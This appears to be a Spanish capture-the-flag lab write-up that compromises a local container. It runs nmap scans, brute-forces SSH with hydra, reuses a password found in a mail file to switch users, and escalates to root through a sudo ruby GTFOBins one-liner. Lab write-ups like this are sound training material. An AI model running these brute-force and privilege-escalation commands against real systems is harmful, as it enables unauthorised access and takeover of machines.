## Reconocimiento

Realizo escaneo en búsqueda de puertos
```
nmap -p- --open --min-rate 5000 -sS -n -Pn 172.17.0.2 -oG escaneo
```
Los puertos encontrados son el 22 (SSH) y 80 (HTML)}

Realizo otro escaneo en búsqueda de servicios y versiones.
```
nmap -sCV -p22,80 172.17.0.2 -oN puertos
```
El resultado encontrado:
- SSH   :    OpenSSH 7.6 
- HTTP   :  Apache 2.4.29

## Enumeración web

Al realizar una búsqueda en el código fuente de la pagina encuentro un mensaje:

```
De: Juan
Para: Camilo
te he dejado un correo es importante
```

Identifico dos posibles usuarios:
- juan
- camilo

## Fuerza bruta SSH

Realizo ataque de fuerza bruta con hydra en búsqueda de posibles contraseñas.
Creo un diccionario con los usuarios encontrados, luego realizo fuerza bruta
```
hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Encuentro la contraseña para el usuario **camilo**
```
camilo :  password1
```

Ingreso con el usuario **camilo** y la contraseña encontrada
```
ssh camilo@172.17.0.2
```

## Enumeración interna

Una vez como el usuario **camilo** busco el mail mencionado en la pagina web.
```
/var/mail/camilo/correo.txt
```
El contenido encontrado es :
```
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe.
Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

## Movimiento lateral

Una vez con la contraseña que encontré cambio al usuario juan
```
su juan
contraseña : 2k84dicb
```

## Escalada de privilegio

Reviso los permisos para el usuario juan
```
sudo -l 
(ALL) NOPASSWD: /usr/bin/ruby
```

El usuario juan tiene permisos sudo para ejecutar ruby sin contraseña.  
Esto permite ejecutar comandos arbitrarios como root.  
  
Usando ruby se puede ejecutar una shell bash con privilegios root.
Realizo búsqueda en GTFOBins para poder escalar privilegio.

```
sudo ruby -e 'exec "/bin/bash"'
```

## Acceso root
Verifico que el usuario sea root
```
root@41cb4343b30c:/var/mail/camilo# id
uid=0(root) gid=0(root) groups=0(root)
```
